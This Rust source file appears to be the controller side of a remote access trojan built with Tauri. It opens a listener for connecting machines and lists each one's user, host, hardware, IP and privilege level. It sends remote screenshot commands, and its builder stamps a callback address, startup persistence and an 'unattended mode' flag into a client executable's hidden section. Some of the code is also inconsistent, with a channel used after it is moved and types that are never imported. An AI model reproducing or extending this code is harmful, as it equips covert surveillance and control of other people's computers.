use tauri::State;
use crate::handlers::{ SharedTauriState, FrontClient, TauriState };
use common::commands::{ Command};

use serde::Serialize;
use object::{ Object, ObjectSection };
use std::fs::{ self, File };
use std::io::Write;
use std::vec;
use std::ptr::null_mut as NULL;
use winapi::um::winuser;

use tokio::net::TcpListener;
use tokio::sync::mpsc;
use crate::commands::ServerCommand;
use crate::new_server::ServerWrapper;

use std::sync::Arc;
use std::sync::Mutex;

use rmp_serde::Serializer;

#[tauri::command]
pub async fn start_server(
    port: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let tauri_state: std::sync::MutexGuard<'_, TauriState> = tauri_state.0.lock().unwrap();
    
    let (ctx, crx) = mpsc::channel::<ServerCommand>(32);

    if tauri_state.channel_tx.set(ctx.clone()).is_err() {
        return Err("false".to_string());
    }

    tauri_state.channel_rx.set(Arc::new(Mutex::new(crx)));

    let server_task = tokio::spawn(async move {
        match ServerWrapper::spawn(crx).await {
            Ok(_) => println!("Server started successfully"),
            Err(e) => eprintln!("Failed to start server: {}", e),
        }
    });

    let ctx_for_listener = ctx.clone();

    let port = port.parse::<u16>().unwrap();

    let listener_task = tokio::spawn(async move {
        match TcpListener::bind(("0.0.0.0", port)).await {
            Ok(listener) => {
                println!("Listening on port {}", port);
                loop {
                    match listener.accept().await {
                        Ok((socket, addr)) => {
                            let ctx = ctx_for_listener.clone();
                            ClientWrapper::spawn(socket, addr, ctx).await;
                        },
                        Err(e) => {
                            eprintln!("Error accepting connection: {}", e);
                            break;
                        }
                    }
                }
            },
            Err(e) => {
                eprintln!("Failed to bind to port {}: {}", port, e);
            }
        }
    });

    Ok("true".to_string())
}

#[tauri::command]
pub fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> TauriState {
    let tauri_state = tauri_state.0.lock().unwrap();
    tauri_state.clone()
}

#[tauri::command]
pub fn build_client(
    ip: &str,
    port: &str,
    mutex_enabled: bool,
    mutex: &str,
    unattended_mode: bool,
    startup: bool
) {
    let bin_data = fs::read("target/debug/client.exe").unwrap();
    let file = object::File::parse(&*bin_data).unwrap();

    let mut output_data = bin_data.clone();

    let config = common::ClientConfig {
        ip: ip.to_string(),
        port: port.to_string(),
        mutex_enabled,
        mutex: mutex.to_string(),
        unattended_mode,
        startup,
    };

    let mut buffer: Vec<u8> = Vec::new();

    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();

    let mut new_data = vec![0u8; 1024];

    for (i, byte) in buffer.iter().enumerate() {
        new_data[i] = *byte;
    }

    if let Some(section) = file.section_by_name(".zzz") {
        let offset = section.file_range().unwrap().0 as usize;
        let size = section.size() as usize;

        output_data[offset..offset + size].copy_from_slice(&new_data);
    }

    let mut file = File::create("target/debug/Client_built.exe").unwrap();
    let _ = file.write_all(&output_data);
}

#[tauri::command]
pub fn fetch_clients(
    server_state: State<'_, SharedServer>,
    tauri_state: State<'_, SharedTauriState>
) -> Vec<FrontClient> {
    let server = server_state.0.lock().unwrap();

    let tauri_state = tauri_state.0.lock().unwrap();

    if !tauri_state.running {
        return vec![];
    }

    let mut clients: Vec<FrontClient> = vec![];

    for (i, client) in (*server.clients.lock().unwrap()).iter_mut().enumerate() {
        // if !client.is_handled {
        //     client.is_handled = true;
        //     client.handle_client();
        // }

        if client.is_disconnect() {
            continue;
        }

        let front_client = FrontClient {
            id: i,
            username: client.get_username(),
            hostname: client.get_hostname(),
            os: client.get_os(),
            ram: client.get_ram(),
            cpu: client.get_cpu(),
            gpus: client.get_gpus(),
            storage: client.get_storage(),
            displays: client.get_displays(),
            ip: client.get_ip(),
            disconnected: client.is_disconnect(),
            is_elevated: client.is_elevated(),
        };

        clients.push(front_client);
    }
    clients.clone()
}

#[tauri::command]
pub fn fetch_client(id: &str, server_state: State<'_, SharedServer>) -> FrontClient {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let clients = server.clients.lock().unwrap();
    let client = clients.get(client_id).unwrap();

    FrontClient {
        id: client_id,
        username: client.get_username(),
        hostname: client.get_hostname(),
        os: client.get_os(),
        ram: client.get_ram(),
        cpu: client.get_cpu(),
        gpus: client.get_gpus(),
        storage: client.get_storage(),
        displays: client.get_displays(),
        ip: client.get_ip(),
        disconnected: client.is_disconnect(),
        is_elevated: client.is_elevated(),
    }
}

#[tauri::command]
pub fn take_screenshot(id: &str, display: i32, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(
        Command::ScreenshotDisplay(display.to_string()),
        &Some(client.get_secret())
    );
}